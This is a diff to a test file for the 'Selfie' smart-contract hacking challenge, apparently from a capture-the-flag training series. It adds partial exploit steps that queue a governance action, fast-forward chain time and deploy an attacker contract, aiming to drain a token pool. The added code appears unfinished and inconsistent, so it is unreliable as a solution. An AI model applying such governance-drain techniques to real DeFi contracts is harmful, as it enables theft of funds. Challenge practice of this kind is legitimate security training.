@@ -31,11 +31,16 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const actionId = this.governance.queueAction()
+        await ethers.provider.send("evm_increaseTime",[5*24*60*61]) 
+        const SelfieExploitFactory = await ethers.getContractFactory('SelfieExploitDeployer', attacker);
+        const SelfieExploit = await SelfieExploitFactory.deploy()
+
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-
+       
         // Attacker has taken all tokens from the pool
         expect(
             await this.token.balanceOf(attacker.address)
